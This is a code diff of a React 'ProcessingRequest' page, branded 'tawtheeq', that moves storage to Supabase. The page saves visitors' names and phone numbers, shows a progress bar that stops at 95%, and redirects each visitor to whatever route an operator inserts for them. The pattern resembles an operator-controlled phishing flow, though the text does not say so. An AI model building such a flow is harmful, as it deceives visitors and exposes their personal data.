@@ -2,6 +2,7 @@ import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { useRegistration } from "@/contexts/RegistrationContext";
 import tawtheeqLogo from "@/assets/tawtheeq-logo.png";
+import { supabase } from "@/integrations/supabase/client";
 
 const ProcessingRequest = () => {
   const [progress, setProgress] = useState(0);
@@ -10,20 +11,25 @@ const ProcessingRequest = () => {
   const [userId] = useState(() => `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);
 
   useEffect(() => {
-    // Save user to processing list
-    const userName = data.fullNameArabic || data.fullNameEnglish || "مستخدم غير معروف";
-    const userPhone = data.mobileNumber || data.visitorMobile || "غير متوفر";
-    
-    const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
-    const newUser = {
-      id: userId,
-      name: userName,
-      phone: userPhone,
-      timestamp: new Date().toISOString()
+    // Save user to database
+    const saveUser = async () => {
+      const userName = data.fullNameArabic || data.fullNameEnglish || "مستخدم غير معروف";
+      const userPhone = data.mobileNumber || data.visitorMobile || "غير متوفر";
+
+      const { error } = await supabase
+        .from("processing_users")
+        .insert({
+          user_id: userId,
+          name: userName,
+          phone: userPhone,
+        });
+
+      if (error) {
+        console.error("Error saving user:", error);
+      }
     };
-    
-    processingUsers.push(newUser);
-    localStorage.setItem("processingUsers", JSON.stringify(processingUsers));
+
+    saveUser();
 
     // Simulate progress but stop at 95% to indicate ongoing processing
     const timer = setInterval(() => {
@@ -36,42 +42,66 @@ const ProcessingRequest = () => {
       });
     }, 300);
 
-    // Function to check for navigation instructions
-    const checkNavigation = () => {
-      const navigationInstructions = JSON.parse(localStorage.getItem("navigationInstructions") || "{}");
-      if (navigationInstructions[userId]) {
-        const route = navigationInstructions[userId];
-        
-        // Remove the instruction and user from storage
-        delete navigationInstructions[userId];
-        localStorage.setItem("navigationInstructions", JSON.stringify(navigationInstructions));
-        
-        const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
-        const updatedUsers = processingUsers.filter((u: any) => u.id !== userId);
-        localStorage.setItem("processingUsers", JSON.stringify(updatedUsers));
-        
-        // Navigate to the specified route
-        navigate(route);
-      }
-    };
+    // Subscribe to navigation instructions from database
+    const channel = supabase
+      .channel("navigation_instructions_changes")
+      .on(
+        "postgres_changes",
+        {
+          event: "INSERT",
+          schema: "public",
+          table: "navigation_instructions",
+          filter: `user_id=eq.${userId}`,
+        },
+        async (payload) => {
+          const route = payload.new.route;
 
-    // Check immediately and then every 500ms for faster response
-    checkNavigation();
-    const navigationCheck = setInterval(checkNavigation, 500);
+          // Remove the instruction and user from database
+          await supabase
+            .from("navigation_instructions")
+            .delete()
+            .eq("user_id", userId);
 
-    // Listen for storage events from other tabs/windows
-    const handleStorageChange = (e: StorageEvent) => {
-      if (e.key === "navigationInstructions") {
-        checkNavigation();
-      }
-    };
-    
-    window.addEventListener("storage", handleStorageChange);
+          await supabase
+            .from("processing_users")
+            .delete()
+            .eq("user_id", userId);
+
+          // Navigate to the specified route
+          navigate(route);
+        }
+      )
+      .on(
+        "postgres_changes",
+        {
+          event: "UPDATE",
+          schema: "public",
+          table: "navigation_instructions",
+          filter: `user_id=eq.${userId}`,
+        },
+        async (payload) => {
+          const route = payload.new.route;
+
+          // Remove the instruction and user from database
+          await supabase
+            .from("navigation_instructions")
+            .delete()
+            .eq("user_id", userId);
+
+          await supabase
+            .from("processing_users")
+            .delete()
+            .eq("user_id", userId);
+
+          // Navigate to the specified route
+          navigate(route);
+        }
+      )
+      .subscribe();
 
     return () => {
       clearInterval(timer);
-      clearInterval(navigationCheck);
-      window.removeEventListener("storage", handleStorageChange);
+      supabase.removeChannel(channel);
     };
   }, [userId, data, navigate]);
 
